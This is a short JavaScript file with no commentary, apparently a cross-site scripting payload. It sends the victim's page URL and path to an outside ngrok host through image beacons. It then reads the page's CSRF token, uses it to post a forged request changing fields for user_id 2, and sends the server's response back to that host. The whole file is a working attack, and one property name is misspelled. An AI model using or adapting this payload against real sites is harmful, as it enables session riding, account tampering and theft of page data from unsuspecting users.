function send2server(name, data){
    img = document.createElement("img");
    img.src = "https://e8023e55.ngrok.io/record-data?name="+name+"&data="+btoa(encodeURI(data));
    document.body.appendChild(img);
}

send2server("url", window.location.href);
send2server("url", window.location.pathname);

window.addEventListener('load', function () {
    let xhr = new XMLHttpRequest();
    xhr.open("POST", window.location.pathname, true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    xhr.withCredntials=true;
    xhr.onload = function() { 
        send2server("status", " "+xhr.status);
        send2server("response", xhr.response);
    };
    xhr.onerror = function() {
        send2server("status", "Network error");
    };
    xhr.onprogress = function(event) {
        send2server("status", "Received " + event.loaded + " of " + event.total);
    };
    xhr.send("name=Nice&user_id=2&_csrf_token="+document.getElementsByName("_csrf_token")[0].value);
});
